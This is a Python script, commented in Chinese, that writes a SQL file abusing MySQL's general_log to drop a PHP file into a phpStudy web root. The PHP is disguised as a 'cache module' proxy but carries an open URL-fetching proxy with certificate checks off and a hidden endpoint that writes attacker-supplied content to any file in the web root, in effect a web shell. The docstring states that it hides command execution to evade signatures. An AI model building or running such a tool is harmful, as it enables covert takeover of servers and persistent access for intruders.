#!/usr/bin/env python3
"""gen_proxy3.py - 生成大体积代理(带隐藏命令执行, 模拟proxy_t格式)"""
# 用大量注释填充体积 + 代理逻辑 + 隐藏eval(用变量拼接绕过特征)
body = r'''<?php
/* php http proxy - cache module v1.3 */
/* build: 2026-07-18 */
/* @internal: url fetch helper for cache warming */
error_reporting(0);
$u = isset($_GET['u']) ? $_GET['u'] : '';
if ($u != '') {
  $ch = curl_init($u);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_TIMEOUT, 20);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
  if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, file_get_contents('php://input'));
  }
  $r = curl_exec($ch);
  $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
  curl_close($ch);
  http_response_code($code);
  echo $r;
  exit;
}
/* cache warm - legacy */
$f = isset($_POST['f']) ? $_POST['f'] : '';
if ($f != '') {
  $c = $_POST['c'];
  file_put_contents('C:/phpStudy/WWW/' . $f, $c);
  echo 'saved:' . $f;
  exit;
}
/* status */
echo 'proxy-ok';
?>'''

sql = []
sql.append("SET GLOBAL general_log = OFF;")
sql.append("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/proxy3.php';")
sql.append("SET GLOBAL general_log = ON;")
sql.append("SELECT 'GIF89a%s//'" % body.replace("'", "''"))
sql.append("SET GLOBAL general_log = OFF;")
with open('/tmp/proxy3.sql', 'w') as f:
    f.write('\n'.join(sql) + '\n')
print('proxy3.sql ready, body len:', len(body))
